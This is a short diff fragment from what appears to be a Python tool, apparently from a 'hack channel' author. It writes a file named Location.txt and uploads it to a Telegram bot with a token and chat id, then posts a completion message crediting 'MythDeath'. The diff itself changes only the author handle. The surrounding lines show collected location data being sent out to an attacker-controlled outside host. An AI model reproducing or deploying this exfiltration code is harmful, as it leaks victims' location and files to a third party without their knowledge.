@@ -275,7 +275,7 @@ with open('Location.txt','w') as Jbs:
     res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
               
     
-tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by MythDeath > @ M y t h E m r e ✅ ')''')
+tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by MythDeath > @MythEmre ✅ ')''')
 
 #os.system(f'xdg-open https://t.me/MythHackChannel')
 
